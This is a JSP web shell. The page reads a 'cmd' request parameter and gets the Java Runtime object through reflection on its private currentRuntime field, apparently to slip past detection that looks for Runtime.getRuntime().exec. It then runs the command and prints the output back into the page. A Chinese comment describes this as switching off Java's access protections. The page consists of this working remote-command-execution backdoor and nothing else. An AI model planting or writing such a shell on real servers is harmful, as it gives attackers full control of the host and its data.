<%@ page import="java.io.*" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page language="java" pageEncoding="UTF-8" %>

<%
    String cmd = request.getParameter("cmd");
//    Process pc = Runtime.getRuntime().exec(cmd);

    Class<?> cl = Class.forName("java.lang.Runtime");
    Field fd = cl.getDeclaredField("currentRuntime");
    fd.setAccessible(true);//不执行java语言的访问检查 ，可以理解为关闭java类的相关保护机制，越权获取对象的私有变量
    Runtime rt = (Runtime) fd.get(null);
    Process pc = rt.exec(cmd);

    InputStream in =pc.getInputStream();
    InputStreamReader  isr = new InputStreamReader(in);
    BufferedReader br = new BufferedReader(isr);

    StringBuilder a=new StringBuilder("");
    String s=null;
    while((s=br.readLine())!=null){
        a.append(s+"\n");
    }

    response.getWriter().println("<pre>");
    response.getWriter().println(a);
    response.getWriter().println("</pre>");

%>